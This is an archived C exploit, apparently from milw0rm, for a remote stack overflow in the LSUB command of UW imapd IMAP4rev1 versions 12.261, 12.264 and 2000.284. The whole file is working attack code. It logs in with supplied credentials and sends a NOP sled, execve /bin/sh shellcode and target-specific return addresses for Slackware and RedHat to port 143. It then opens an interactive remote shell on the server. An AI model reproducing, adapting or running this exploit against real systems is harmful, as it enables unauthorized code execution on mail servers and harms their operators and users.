<html><head><title>IMAP4rev1 12.261/12.264/2000.284 (lsub) Remote Exploit</title></head><pre>/* 
 *			!!! Private !!!
 *
 *  imapd IMAP4rev1 v12.261, v12.264 and 2000.284 Remote Exploit. Others? Yes!
 *
 *  By: SkyLaZarT ( fcerqueira@bufferoverflow.org ) .aka. Felipe Cerqueira
 *  Homepage: www.BufferOverflow.Org
 *  Thankz: cync, oldm and Jans. ( BufferOverflow.org Team )
 *		Antonio Marcelo and Felipe Saraiva
 *
 */


#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;signal.h&gt;

#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;

#define SIZE		1064
#define NOP		0x90
#define RET12261	0xbffff3ec
#define RET12264	0xbffff4e0
#define RET12264ZOOT	0xbffff697
#define RET2000_284	0xbfffebc8

#define INIT(x)	bzero(x, sizeof(x))
#define READ(sock,x) read(sock, x, sizeof(x)) 


#define TIMEOUT		20

char shellcode[] =
        &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
        &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
        &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;

int debug = 0;


void openshell(int sock, int check);
void processSignal(int signum);

void processSignal(int signum) {
	fprintf(stderr, &quot;Time out!!\n&quot;);
	exit(-1);
}


void openshell(int sock, int check) {
	char buffer[1024];
	fd_set rset;
	int i;
	
	while(1) {
		FD_ZERO(&amp;rset);
		FD_SET(sock, &amp;rset);
		FD_SET(fileno(stdin), &amp;rset);

		select(sock + 1, &amp;rset, NULL, NULL, NULL);

		if (FD_ISSET(sock, &amp;rset)) {
			if ((i = read(sock, buffer, sizeof(buffer))) &lt;= 0) {
				fprintf(stderr, &quot;Connection terminated!\n&quot;);
				close(sock);
				exit(-1);
			} else {
				buffer[i] = 0x00;
				if(check) {
					if (!(strstr(buffer, &quot;uid&quot;))) {
						fprintf(stderr, &quot;Exploit failed\n&quot;);
						exit(-1);
					} else {
						fprintf(stderr, &quot;Exploit Success!!\n&quot;);
						check = 0;
					} 
				}

				puts(buffer);
			}
		}

		if (FD_ISSET(fileno(stdin), &amp;rset)) {
			if ( check ) write(sock, &quot;id\n&quot;, 3);
				
			if ((i = read(fileno(stdin), buffer, 
					sizeof(buffer))) &gt; 0) {
				buffer[i] = 0x00;
				write(sock, buffer, i);
			}
		}
	}
}
				
				
int main(int argc, char **argv) {
	char buffer[SIZE], sockbuffer[2048];
	char *login, *password;
	long retaddr; 
	struct sockaddr_in sin;
	struct hostent *hePtr;
	int sock, i;	

	fprintf(stderr, &quot;\nRemote exploit for IMAP4rev1 v12.261, v12.264 and 2000.284\n&quot;
		&quot;Developed by SkyLaZarT - www.BufferOverflow.org\n\n&quot;);

	if ( argc &lt; 5 ) {
		fprintf(stderr, &quot;%s &lt;host&gt; &lt;login&gt; &lt;password&gt; &lt;type&gt; [offset]\n&quot;, argv[0]);
		fprintf(stderr, &quot;\ttype: [0]\tSlackware 7.0 with IMAP4rev1 v12.261\n&quot;
				&quot;\ttype: [1]\tSlackware 7.1 with IMAP4rev1 v12.264\n&quot;
				&quot;\ttype: [2]\tRedHat 6.2 ZooT with IMAP4rev1 v12.264\n&quot;
				&quot;\ttype: [3]\tSlackware 7.0 with IMAP4rev1 2000.284\n\n&quot;);


		exit(-1);
	}

	login = argv[2];
	password = argv[3];

	switch(atoi(argv[4])) {
		case 0: retaddr = RET12261; break;
		case 1: retaddr = RET12264; break;
		case 2: retaddr = RET12264ZOOT; break;
		case 3: retaddr = RET2000_284; break;
		default: 
			fprintf(stderr, &quot;invalid type.. assuming default &quot; 
				&quot;type 0\n&quot;);
			retaddr = RET12261; break;
			
	}

	if ( argc == 6 ) 
		retaddr += atoi(argv[5]);

	signal(SIGALRM, processSignal);	

	fprintf(stderr, &quot;Trying to exploit %s...\n&quot;, argv[1]);

	fprintf(stderr, &quot;Using return address 0x%08lx. Shellcode size: %i bytes\n\n&quot;, retaddr, strlen(shellcode));


	alarm(TIMEOUT);
	hePtr = gethostbyname(argv[1]);
	if (!hePtr) {
		fprintf(stderr, &quot;Unknow hostname : %s\n&quot;, strerror(errno));
		exit(-1);
	}
	alarm(0);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if ( sock &lt; 0 ) {
		perror(&quot;socket()&quot;);
		exit(-1);
	}

	sin.sin_family = AF_INET;
	sin.sin_port = htons(143);
	memcpy(&amp;sin.sin_addr, hePtr-&gt;h_addr, hePtr-&gt;h_length);
	bzero(&amp;(sin.sin_zero), 8);

	fprintf(stderr, &quot;Connecting... &quot;); 
	alarm(TIMEOUT);
	if ( connect(sock, (struct sockaddr *)&amp;sin, sizeof(sin)) &lt; 0 ) {
		fprintf(stderr, &quot;failed to %s:143\n&quot;, argv[1]);
		exit(-1);
	}
	alarm(0);	
	
	fprintf(stderr, &quot;OK\n&quot;);

	
        for ( i = 0; i &lt;= SIZE; i += 4 )
                *(long *)&amp;buffer[i] = retaddr;

        for ( i = 0; i &lt; ( SIZE - strlen(shellcode) - 100); i++ )
                *(buffer+i) = NOP;

        memcpy(buffer + i, shellcode, strlen(shellcode));

	INIT(sockbuffer);
	READ(sock, sockbuffer);

	if(debug) fprintf(stderr, &quot;debug %s&quot;, sockbuffer);	

	fprintf(stderr, &quot;Trying to loging ... &quot;);

	sprintf(sockbuffer, &quot;1 LOGIN %s %s\n&quot;, login, password);
	write(sock, sockbuffer, strlen(sockbuffer));
	
	INIT(sockbuffer);
	READ(sock, sockbuffer);

	if(debug) fprintf(stderr, &quot;debug %s&quot;, sockbuffer);
	
	if (!(strstr(sockbuffer, &quot;OK LOGIN completed&quot;))) {
		fprintf(stderr, &quot;Login failed!!\n&quot;);
		close(sock);
		exit(-1);
	}

	fprintf(stderr, &quot;OK\n&quot;);
	
	INIT(sockbuffer);
	sprintf(sockbuffer, &quot;1 LSUB \&quot;\&quot; {1064}\r\n&quot;);
	write(sock, sockbuffer, strlen(sockbuffer));

        INIT(sockbuffer);
        READ(sock, sockbuffer);

	if(debug) fprintf(stderr, &quot;debug %s&quot;, sockbuffer);
	
	if(!(strstr(sockbuffer, &quot;Ready&quot;))) {
		fprintf(stderr, &quot;LSUB command failed\n&quot;);
		close(sock);
		exit(-1);
	}	

	fprintf(stderr, &quot;Sending shellcode... &quot;);	
	
	write(sock, buffer, 1064);
	write(sock, &quot;\r\n&quot;, 2);

	fprintf(stderr, &quot;OK\n&quot;);
	
	fprintf(stderr, &quot;PRESS ENTER for exploit status!!\n\n&quot;);	

	openshell(sock, 1);	
							
	close(sock);

	return 0;
}

// milw0rm.com [2001-03-03]</pre></html>